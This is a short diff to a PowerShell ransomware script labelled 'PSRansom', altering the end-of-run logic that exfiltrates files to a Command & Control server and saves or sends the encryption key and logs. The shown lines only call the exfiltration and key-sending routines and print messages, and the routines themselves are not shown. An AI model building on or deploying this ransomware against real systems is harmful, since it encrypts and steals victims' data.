@@ -1,4 +1,4 @@
-#================================#
+﻿#================================#
 #     PSRansom by @JoelGMSec     #
 #      https://darkbyte.net      #
 #================================#
@@ -210,8 +210,7 @@ else {
    if ($Exfil -eq "-x") { Write-Host "[i] Exfiltrating files to Command & Control Server.." -ForegroundColor Green
       ExfiltrateFiles ; sleep 1 }}
 
-   if (!$C2Status) { Write-Host "[+] Saving key and logs to current folder.." -ForegroundColor Blue 
-      $RansomLogs = Get-Content "$Directory$slash$Readme" ; if (!$RansomLogs) { Add-Content -Path "$Directory$slash$Readme" -Value "[!] No files have been encrypted!" }}
-   else { Write-Host "[+] Sending key and logs to Command & Control Server.." -ForegroundColor Blue ; SendOK }}
+   if (!$C2Status) { Write-Host "[+] Saving logs and key in readme.txt.." -ForegroundColor Blue }
+   else { Write-Host "[+] Sending logs and key to Command & Control Server.." -ForegroundColor Blue ; SendOK }}
 
 sleep 1 ; Write-Host "[i] Done!" -ForegroundColor Green ; Write-Host
